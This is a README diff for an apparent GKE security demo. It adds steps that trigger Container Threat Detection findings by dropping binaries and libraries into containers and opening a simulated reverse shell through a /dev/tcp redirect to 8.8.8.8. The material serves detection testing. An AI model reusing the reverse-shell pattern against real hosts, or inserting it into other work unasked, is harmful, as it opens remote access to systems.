@@ -40,6 +40,41 @@ series. Otherwise, you might experience Terraform state snapshot lock errors.
 1. Run `terraform plan` and review the output.
 1. Run `terraform apply`
 
+## Generate Threat Findings
+
+While several findings will automatically trigger during the deployment, the following instructions can be leveraged to trigger Container Threat Detection and Data exfiltration findings.
+
+1. Set variables 
+```
+export PROJECT_ID=YOUR_PROJECT_ID
+export GKE_CLUSTER=YOUR_GKE_CLUSTER_NAME
+```
+1. Download Cluster credentials
+```
+gcloud container clusters get-credentials $GKE_CLUSTER \
+ --zone us-central1 \
+ --project $PROJECT_ID
+```
+1. Add a binary to a running container
+```
+tag="dropped-binary-$(date +%Y-%m-%d-%H-%M-%S)"
+kubectl run --restart=Never --rm=true --wait=true -i \
+--image marketplace.gcr.io/google/ubuntu1804:latest \
+"$tag" -- bash -c "cp /bin/ls /tmp/$tag; /tmp/$tag"
+```
+1. Add a library to a running container
+tag="dropped-library-$(date +%Y-%m-%d-%H-%M-%S)"
+kubectl run --restart=Never --rm=true --wait=true -i \
+--image marketplace.gcr.io/google/ubuntu1804:latest \
+"$tag" -- bash -c "cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/$tag; /lib64/ld-linux-x86-64.so.2 /tmp/$tag"
+
+1. Start a reverse shell in running container
+tag="reverse-shell-$(date +%Y-%m-%d-%H-%M-%S)"
+kubectl run --restart=Never --rm=true --wait=true -i \
+--image marketplace.gcr.io/google/ubuntu1804:latest \
+"$tag" -- bash -c "/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1"
+
+
 ### Optional Deploy a Cloud Build environment
 
 1. Deploy Bootstrap environment from [Cloud Foundation Toolkit](https://github.com/terraform-google-modules/terraform-example-foundation/tree/master/0-bootstrap)
